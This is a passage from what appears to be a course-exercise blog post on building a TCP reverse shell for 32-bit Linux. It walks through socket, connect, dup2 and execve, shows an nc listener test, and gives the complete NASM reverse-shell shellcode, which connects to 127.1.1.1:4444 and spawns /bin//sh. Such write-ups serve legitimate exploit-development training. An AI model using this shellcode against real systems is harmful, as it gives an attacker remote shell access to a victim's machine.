svg{top:.125em;position:relative}</style>
+<div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379.0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628.0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628.0l-22.627 22.627c-6.248 6.248-6.248 16.379.0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937.0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154.0l239.94 416.028zM288 354c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196.0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627.0 12 5.373 12 12v1e2h12c6.627.0 12 5.373 12 12v24z"/></symbol></svg></div><div class="notice info">
+<p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#info-notice"/></svg></span>Info</p><h3 id=syscall-arguments>Syscall Arguments<a hidden class=anchor aria-hidden=true href=#syscall-arguments>#</a></h3>
+<p>The arguments and their values for the syscalls will be explained later in the creation of the TCP Reverse Shell in Assembly.</div>
+<p>In order to prove that the Reverse Shell is working we have to compile the <code>C</code> program using the GNU Compiler (<code>gcc</code>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ gcc reverse-c.c -o reverse-c
+</code></pre></div><p>First, create a listener with <code>nc</code> on port <code>4444</code> and wait for connections:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp <span style=color:#ae81ff>4444</span>
+</code></pre></div><p>Then, in another terminal execute <code>reverse-c</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse-c
+
+</code></pre></div><p>In the first terminal verify the incoming connection and run the commands <code>id</code> and <code>ls</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>Listening on <span style=color:#f92672>[</span>0.0.0.0<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>family 0, port 4444<span style=color:#f92672>)</span>
+Connection from <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>]</span> port <span style=color:#ae81ff>4444</span> <span style=color:#f92672>[</span>tcp/*<span style=color:#f92672>]</span> accepted <span style=color:#f92672>(</span>family 2, sport 35304<span style=color:#f92672>)</span>
+id
+uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>geobour98<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>geobour98<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>geobour98<span style=color:#f92672>)</span>,4<span style=color:#f92672>(</span>adm<span style=color:#f92672>)</span>,24<span style=color:#f92672>(</span>cdrom<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>sudo<span style=color:#f92672>)</span>,30<span style=color:#f92672>(</span>dip<span style=color:#f92672>)</span>,46<span style=color:#f92672>(</span>plugdev<span style=color:#f92672>)</span>,113<span style=color:#f92672>(</span>lpadmin<span style=color:#f92672>)</span>,128<span style=color:#f92672>(</span>sambashare<span style=color:#f92672>)</span>
+ls
+compile.sh
+reverse
+reverse-c
+reverse-c.c
+reverse.nasm
+reverse.o
+reverse.py
+exit
+geobour98@slae32-dev:~$
+</code></pre></div><h2 id=tcp-reverse-shell-in-assembly>TCP Reverse Shell in Assembly<a hidden class=anchor aria-hidden=true href=#tcp-reverse-shell-in-assembly>#</a></h2>
+<p>In order to implement the syscalls in Assembly, we have to find their defined numbers. These are located at the header file: <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code>.</p>
+<p>The syscalls and their definitions can be found in the following table:</p>
+<table>
+<thead>
+<tr>
+<th>Syscall</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>socket</code></td>
+<td><code>#define __NR_socket 359</code></td>
+</tr>
+<tr>
+<td><code>connect</code></td>
+<td><code>#define __NR_connect 362</code></td>
+</tr>
+<tr>
+<td><code>dup2</code></td>
+<td><code>#define __NR_dup2 63</code></td>
+</tr>
+<tr>
+<td><code>execve</code></td>
+<td><code>#define __NR_execve 11</code></td>
+</tr>
+</tbody>
+</table>
+<p>Now we have to find the arguments and their values in order to be used in the syscalls.</p>
+<ul>
+<li>Syscall <code>socket</code>:</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>int socket<span style=color:#f92672>(</span>int domain, int type, int protocol<span style=color:#f92672>)</span>;
+</code></pre></div><p>The <code>domain</code> argument specifies a communication domain. Since we operate through IPv4 protocol, we will use the <code>AF_INET</code> address family, which according to the socket header file: <code>/usr/include/i386-linux-gnu/bits/socket.h</code> belongs to the <code>PF_INET</code> protocol family. This protocol family is represented by the number <code>2</code>.</p>
+<p>The <code>type</code> argument specifies the communication semantics. We will use <code>SOCK_STREAM</code>, since it provides sequenced, reliable, two-way, connection-based byte streams. According to the socket_type header file: <code>/usr/include/i386-linux-gnu/bits/socket_type.h</code>, <code>SOCK_STREAM</code> is represented by the number <code>1</code>.</p>
+<p>The <code>protocol</code> argument specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case <code>protocol</code> can be specified as <code>0</code>.</p>
+<p>The return value from <code>socket</code> is a file descriptor for the new socket, if socket was executed successfully.</p>
+<ul>
+<li>Syscall <code>connect</code>:</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>int connect<span style=color:#f92672>(</span>int sockfd, const struct sockaddr *addr, socklen_t addrlen<span style=color:#f92672>)</span>;
+</code></pre></div><p>The <code>sockfd</code> argument is the file descriptor returned from <code>socket</code> execution. It is an integer value.</p>
+<p>The <code>*addr</code> argument is the address structure that will be assigned to the socket. The structure consists of 3 values. The first value is the <code>AF_INET</code>, which from before is the number <code>2</code>. The second value is the port that the target will be connected to, which in our case is <code>4444</code>. The third value is the interface that the socket will connect to. We provide the value <code>127.1.1.1</code> in order to connect to the loopback interface (<code>127.0.0.0/8</code>). Note that we avoid addresses like <code>127.0.0.1</code> (that contain <code>0</code>), so we don&rsquo;t have nullbytes in the shellcode.</p>
+<p>The <code>addrlen</code> argument is the size, in bytes, of the address structure pointed to by <code>addr</code>. According to the header file: <code>/usr/include/linux/in.h</code> the size is <code>16</code> bytes.</p>
+<ul>
+<li>Syscall <code>dup2</code>:</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>int dup2<span style=color:#f92672>(</span>int oldfd, int newfd<span style=color:#f92672>)</span>;
+</code></pre></div><p>The argument <code>oldfd</code> is the integer returned from <code>socket</code>.</p>
+<p>If the descriptor <code>newfd</code> was previously open, it is silently closed before being reused. If <code>oldfd</code> is a valid file descriptor, and <code>newfd</code> has the same value as <code>oldfd</code>, then <code>dup2</code> does nothing, and returns <code>newfd</code>. We execute <code>dup2</code> 3 times in order to pass the values: <code>0</code> for <code>STDIN</code>, <code>1</code> for <code>STDOUT</code> and <code>2</code> for <code>STDERR</code>.</p>
+<p>On success <code>dup2</code> returns the new descriptor.</p>
+<ul>
+<li>Syscall <code>execve</code>:</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>int execve<span style=color:#f92672>(</span>const char *filename, char *const argv<span style=color:#f92672>[]</span>, char *const envp<span style=color:#f92672>[])</span>;
+</code></pre></div><p>The <code>*filename</code> argument must be either a binary executable or a script, so we pass to it the executable &ldquo;bin/sh&rdquo;.</p>
+<p>The <code>argv</code> argument is an array of argument strings passed to the new program. The <code>envp</code> argument is an array of strings, conventionally of the form &ldquo;key=value&rdquo;, which are passed as environment to the new program. Since we don&rsquo;t need any of these we pass the value <code>NULL</code>.</p>
+<h3 id=assembly-in-detail>Assembly in Detail<a hidden class=anchor aria-hidden=true href=#assembly-in-detail>#</a></h3>
+<p>Now we will examine the <code>Assembly</code> instructions in detail.</p>
+<ul>
+<li>Syscall <code>socket</code></li>
+</ul>
+<p>We first clear the register <code>EAX</code> and then pass the hexadecimal value <code>0x167</code>, which in decimal is 359. That value is passed to the <code>AX</code> part of the <code>EAX</code> register, which contains the 16 less significant bits. The decimal 359 needs 9 bits in order to be represented in binary and since we must use registers with integer size multiple to 8, we need 16 bits. If we reserved the whole <code>EAX</code> register, then nullbytes (<code>0x00</code>) would be put in the 16 more significant bits that would break our shellcode.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> ax, <span style=color:#ae81ff>0x167</span>		<span style=color:#75715e>; 167 is the hex value of the decimal 359 for socket</span>
+</code></pre></div><p>Then we clear the <code>EBX</code> register and pass to <code>BL</code> the value <code>2</code>, since there is the <code>PF_INET</code> protocol family.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> ebx, ebx
+	<span style=color:#a6e22e>mov</span> bl, <span style=color:#ae81ff>0x2</span>		<span style=color:#75715e>; AF_INET numeric value from PF_INET protocol family</span>
+</code></pre></div><p>After that, we clear the <code>ECX</code> register and pass to <code>CL</code> the value <code>1</code>, since this is the value of <code>SOCK_STREAM</code> constant.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> ecx, ecx
+	<span style=color:#a6e22e>mov</span> cl, <span style=color:#ae81ff>0x1</span>		<span style=color:#75715e>; SOCK_STREAM constant from socket_type.h</span>
+</code></pre></div><p>We clear the <code>EDX</code> register and the value <code>0</code>, because of the single protocol, is passed as the third argument to <code>socket</code> syscall.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> edx, edx		<span style=color:#75715e>; 0 value because of single protocol</span>
+</code></pre></div><p>Then, in order to actually execute the syscall, we run the following instruction:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; exec socket syscall</span>
+</code></pre></div><p>That instruction will be invoked after declaring the arguments of each syscall in order to be executed.</p>
+<p>The <code>socket</code> syscall returns a file descriptor (<code>sockfd</code>), so we copy it to the <code>EBX</code> register, since the result of the syscall is saved in the <code>EAX</code> register by default.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>mov</span> ebx, eax		<span style=color:#75715e>; move sockfd (file descriptor) value into ebx</span>
+</code></pre></div><ul>
+<li>Syscall <code>connect</code></li>
+</ul>
+<p>We clear the <code>EAX</code> register and then pass the hexadecimal value <code>0x16a</code>, which in decimal is 362. Note that these values come from the table with the <code>syscalls</code> and their <code>definitions</code> from above.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> ax, <span style=color:#ae81ff>0x16a</span>		<span style=color:#75715e>; 16a is the hex value of the decimal 362 for connect</span>
+</code></pre></div><div class="notice info">
+<p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#info-notice"/></svg></span>Info</p><h3 id=stack-vs-registers>Stack vs Registers<a hidden class=anchor aria-hidden=true href=#stack-vs-registers>#</a></h3>
+<p>When we use the stack, as we will for the following arguments, we push the arguments from last to first, since it is Last In First Out data structure. That&rsquo;s not the case with registers, since each argument needs to be stored in a specific register.</div>
+<p>We start with the values for the <code>address</code> structure.</p>
+<p>We push the hexadecimal value <code>0x0101017f</code> to the stack, which is the address <code>127.1.1.1</code> in little endian representation, so the socket connects to the loopback interface (<code>127.0.0.0/8</code>).</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0x0101017f</span>		<span style=color:#75715e>; connect to localhost (127.1.1.1) (little endian)</span>
+</code></pre></div><p>Then, since we are dealing with little endianness the port with decimal value <code>4444</code> and hexadecimal <code>115c</code>, becomes <code>5c11</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>push</span> <span style=color:#66d9ef>word</span> <span style=color:#ae81ff>0x5c11</span>	<span style=color:#75715e>; listen on port 4444 (little endian)</span>
+</code></pre></div><p>After that, we push the value <code>2</code> for the <code>AF_INET</code> constant.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>push</span> <span style=color:#66d9ef>word</span> <span style=color:#ae81ff>0x2</span>		<span style=color:#75715e>; AF_INET constant</span>
+</code></pre></div><p>We clear the <code>ECX</code> register, and save the value of the Stack Pointer (<code>ESP</code> register) there. So now <code>ECX</code> points at the top of the stack.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> ecx, ecx
+	<span style=color:#a6e22e>mov</span> ecx, esp		<span style=color:#75715e>; ecx now points at address struct at the top of the stack</span>
+</code></pre></div><p>Now the values for the struct are defined.</p>
+<p>The <code>EBX</code> register already contains the value of <code>sockfd</code> from <code>socket</code>.</p>
+<p>The <code>ECX</code> register already points at the beginning of the struct in the stack.</p>
+<p>We clear the <code>EDX</code> register, and pass the hexadecimal value <code>0x10</code> (<code>16</code> in decimal), since that is the size of the address struct.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> edx, edx
+	<span style=color:#a6e22e>mov</span> dl, <span style=color:#ae81ff>0x10</span>		<span style=color:#75715e>; 10 is the decimal 16 that is the size of the address struct</span>
+</code></pre></div><p>The final step for the <code>connect</code> syscall is to invoke a syscall interrupt by the next instruction:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; exec connect syscall</span>
+</code></pre></div><ul>
+<li>Syscall <code>dup2</code></li>
+</ul>
+<p>We create a loop that will execute <code>dup2</code> 3 times for <code>STDERR</code>, <code>STDOUT</code> and <code>STDIN</code> respectively. So, we clear the <code>ECX</code> register and pass the value <code>0x3</code> to <code>CL</code>, which is the counter for the loop.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> ecx, ecx
+	<span style=color:#a6e22e>mov</span> cl, <span style=color:#ae81ff>0x3</span>		<span style=color:#75715e>; set counter to 3</span>
+</code></pre></div><p>We first declare the procedure <code>dup2loop</code>, which acts like a function, where we clear the <code>EAX</code> register and pass to <code>AL</code> the hexadecimal value <code>0x3f</code> (<code>63</code> in decimal) as the <code>dup2</code> syscall number. Then, we decrement the counter (<code>CL</code>) by 1, so in the first iteration the value inside <code>CL</code> will be <code>2</code>, representing the <code>STDERR</code>. 2 more iterations will happen with value <code>1</code> and <code>0</code> for <code>STDOUT</code> and <code>STDIN</code> respectively. Each iteration is finished by executing the <code>dup2</code> syscall and by creating a conditional instruction. That instruction checks if the Zero Flag (<code>ZF</code>) is set, meaning it has value <code>0</code>, and if it is the loop is stopped and the execution is continued. If it is not <code>0</code> a <code>jump</code> happens back to <code>dup2loop</code>. In the third iteration, <code>CL</code> is decremented to <code>0</code>, so the <code>ZF</code> is set, and the execution will continue to the next instructions and there will not be a jump back to <code>dup2loop</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>dup2loop:
+	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> al, <span style=color:#ae81ff>0x3f</span>		<span style=color:#75715e>; 3f is the hex value of the decimal 63 for dup2</span>
+
+	<span style=color:#a6e22e>dec</span> cl			<span style=color:#75715e>; decrement counter by 1</span>
+
+	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; exec dup2 syscall</span>
+
+	<span style=color:#a6e22e>jnz</span> dup2loop		<span style=color:#75715e>; jump to loop if ZF is not zero, else continue</span>
+</code></pre></div><ul>
+<li>Syscall <code>execve</code></li>
+</ul>
+<p>We clear the <code>EAX</code> register and pass the hexadecimal value <code>0xb</code> (<code>11</code> in decimal) to <code>AL</code> as the <code>execve</code> syscall number.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> al, <span style=color:#ae81ff>0xb</span>		<span style=color:#75715e>; b is the hex value of the decimal 11 for execve</span>
+</code></pre></div><p>Then we clear the <code>EDX</code> register. The last 2 arguments of <code>execve</code> have <code>NULL</code> values, so we push the <code>EDX</code> value to the stack twice. Also, the executable &ldquo;/bin/sh&rdquo; must be null terminated, so we push one more time the <code>EDX</code> value to the stack.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>xor</span> edx, edx
+	<span style=color:#a6e22e>push</span> edx		<span style=color:#75715e>; NULL argument</span>
+	<span style=color:#a6e22e>push</span> edx		<span style=color:#75715e>; NULL argument</span>
+	<span style=color:#a6e22e>push</span> edx		<span style=color:#75715e>; null terminator</span>
+</code></pre></div><p>Since &ldquo;/bin/sh&rdquo; is only 7 bytes, we need to make it 8 bytes. That is because when a string is pushed to the stack it must be multiplied by 4. The safest way to do that, without breaking any functionality, is to add a <code>/</code>. So the string <code>/bin/sh</code> becomes <code>/bin//sh</code>. The following string would be valid too <code>//bin/sh</code>. Since we are dealing with the stack again, the string must be reversed first. The next <code>python</code> script will help achieve that.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
+
+<span style=color:#f92672>import</span> sys
+
+input <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
+
+print <span style=color:#e6db74>&#39;String length: &#39;</span> <span style=color:#f92672>+</span> str(len(input))
+
+stringList <span style=color:#f92672>=</span> [input[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(input), <span style=color:#ae81ff>4</span>)]
+
+<span style=color:#66d9ef>for</span> item <span style=color:#f92672>in</span> stringList[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]:
+	print item[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; : &#39;</span> <span style=color:#f92672>+</span> str(item[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;hex&#39;</span>))
+</code></pre></div><p>We run the above script by providing the string we want to be reversed.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse.py <span style=color:#e6db74>&#34;/bin//sh&#34;</span>
+String length: <span style=color:#ae81ff>8</span>
+hs// : 68732f2f
+nib/ : 6e69622f
+</code></pre></div><p>Now the string is represented as <code>hex</code> and we can push it to the stack. So we push first the string &ldquo;hs//&rdquo; and then the string &ldquo;nib/&rdquo;.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>        <span style=color:#75715e>; PUSH /bin//sh</span>
+        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0x68732f2f</span>		<span style=color:#75715e>; &#34;hs//&#34;</span>
+        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0x6e69622f</span>		<span style=color:#75715e>; &#34;nib/&#34;</span>
+</code></pre></div><p>Finally, we save <code>ESP</code> value to the <code>EBX</code> register in order to point at the top of the stack and execute the <code>execve</code> syscall.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>	<span style=color:#a6e22e>mov</span> ebx, esp		<span style=color:#75715e>; ebx points at &#34;/bin//sh&#34; at the top of the stack</span>
+
+	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; exec execve syscall</span>
+</code></pre></div><p>The whole <code>Assembly</code> program is the following:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=color:#75715e>; TCP Reverse Shell</span>
+<span style=color:#75715e>; Author: geobour98 </span>
+
+<span style=color:#66d9ef>global</span> _start
+
+<span style=color:#66d9ef>section</span> .text
+
+_start:
+	<span style=color:#75715e>; socket </span>
+	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> ax, <span style=color:#ae81ff>0x167</span>		<span style=color:#75715e>; 167 is the hex value of the decimal 359 for socket</span>
+
+	<span style=color:#a6e22e>xor</span> ebx, ebx
+	<span style=color:#a6e22e>mov</span> bl, <span style=color:#ae81ff>0x2</span>		<span style=color:#75715e>; AF_INET numeric value from PF_INET protocol family</span>
+
+	<span style=color:#a6e22e>xor</span> ecx, ecx
+	<span style=color:#a6e22e>mov</span> cl, <span style=color:#ae81ff>0x1</span>		<span style=color:#75715e>; SOCK_STREAM constant from socket_type.h</span>
+
+	<span style=color:#a6e22e>xor</span> edx, edx		<span style=color:#75715e>; 0 value because of single protocol	</span>
+
+	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; exec socket syscall </span>
+
+	<span style=color:#a6e22e>mov</span> ebx, eax		<span style=color:#75715e>; move sockfd (file descriptor) value into ebx</span>
+
+	<span style=color:#75715e>; connect</span>
+	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> ax, <span style=color:#ae81ff>0x16a</span>		<span style=color:#75715e>; 16a is the hex value of the decimal 362 for connect</span>
+
+	<span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0x0101017f</span>		<span style=color:#75715e>; connect to localhost (127.1.1.1) (little endian)</span>
+	
+	<span style=color:#a6e22e>push</span> <span style=color:#66d9ef>word</span> <span style=color:#ae81ff>0x5c11</span>	<span style=color:#75715e>; connect to port 4444 (little endian)</span>
+	
+	<span style=color:#a6e22e>push</span> <span style=color:#66d9ef>word</span> <span style=color:#ae81ff>0x2</span>		<span style=color:#75715e>; AF_INET constant</span>
+	
+	<span style=color:#a6e22e>xor</span> ecx, ecx
+	<span style=color:#a6e22e>mov</span> ecx, esp		<span style=color:#75715e>; ecx now points at address struct at the top of the stack</span>
+	
+	<span style=color:#a6e22e>xor</span> edx, edx
+	<span style=color:#a6e22e>mov</span> dl, <span style=color:#ae81ff>0x10</span>		<span style=color:#75715e>; 10 is the decimal 16 that is the size of the address struct</span>
+
+	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; execute connect syscall</span>
+
+	<span style=color:#75715e>; dup2 loop</span>
+	<span style=color:#a6e22e>xor</span> ecx, ecx		<span style=color:#75715e>; clear ecx</span>
+	<span style=color:#a6e22e>mov</span> cl, <span style=color:#ae81ff>0x3</span>		<span style=color:#75715e>; set counter to 3</span>
+
+dup2loop:
+	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> al, <span style=color:#ae81ff>0x3f</span>		<span style=color:#75715e>; 3f is the hex value of the decimal 63 for dup2</span>
+
+	<span style=color:#a6e22e>dec</span> cl			<span style=color:#75715e>; decrement counter by 1</span>
+
+	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; exec dup2 syscall</span>
+
+	<span style=color:#a6e22e>jnz</span> dup2loop		<span style=color:#75715e>; jump to loop if ZF is not zero, else continue</span>
+
+	<span style=color:#75715e>; execve</span>
+	<span style=color:#a6e22e>xor</span> eax, eax
+	<span style=color:#a6e22e>mov</span> al, <span style=color:#ae81ff>0xb</span>		<span style=color:#75715e>; b is the hex value of the decimal 11 for execve        </span>
+
+	<span style=color:#a6e22e>xor</span> edx, edx
+	<span style=color:#a6e22e>push</span> edx		<span style=color:#75715e>; NULL argument</span>
+	<span style=color:#a6e22e>push</span> edx		<span style=color:#75715e>; NULL argument</span>
+	<span style=color:#a6e22e>push</span> edx		<span style=color:#75715e>; null terminator</span>
+
+        <span style=color:#75715e>; PUSH /bin//sh</span>
+        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0x68732f2f</span>		<span style=color:#75715e>; &#34;hs//&#34;</span>
+        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0x6e69622f</span>		<span style=color:#75715e>; &#34;nib/&#34;</span>
+
+	<span style=color:#a6e22e>mov</span> ebx, esp		<span style=color:#75715e>; ebx points at &#34;/bin//sh&#34; at the top of the stack</span>
+
+	<span style=color:#a6e22e>int</span> <span style=color:#ae81ff>0x80</span>		<span style=color:#75715e>; exec execve syscall</span>
+</code></pre></div><h2 id=testing-the-reverse-shell>Testing the Reverse Shell<a hidden class=anchor aria-hidden=true href=#testing-the-reverse-shell>#</a></h2>
+<p>In order to test Reverse Shell, we need to compile it. Compilation process consists of 2 separate processes:</p>
+<ul>
